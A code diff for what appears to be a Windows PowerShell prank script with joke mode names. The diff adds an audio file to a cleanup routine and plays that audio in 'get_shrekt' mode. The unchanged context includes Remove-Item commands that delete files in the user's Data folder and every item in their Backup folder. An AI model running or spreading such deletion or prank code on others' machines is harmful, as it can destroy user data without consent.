@@ -97,6 +97,7 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
     Remove-Item "C:\Users\$($env:USERNAME)\Data\src"
     Remove-Item "C:\Users\$($env:USERNAME)\Data\data.png"
     Remove-Item "C:\Users\$($env:USERNAME)\Data\run.bat"
+    Remove-Item "C:\Users\$($env:USERNAME)\Data\audio.mp3"
 
     foreach ($id in (Get-ChildItem "C:\Users\$($env:USERNAME)\Backup\")){
         Remove-Item "C:\Users\$($env:USERNAME)\Backup\$(($id).Name)"
@@ -168,6 +169,11 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
 
 
 } elseif ($mode -eq "get_shrekt") {
+    
+    $audioPath = "C:\Users\$($env:USERNAME)\Data\audio.mp3"
+    $player = New-Object -ComObject WMPlayer.OCX
+    $player.URL = $audioPath
+    $player.controls.play()
 
     Add-Type -AssemblyName PresentationFramework
 
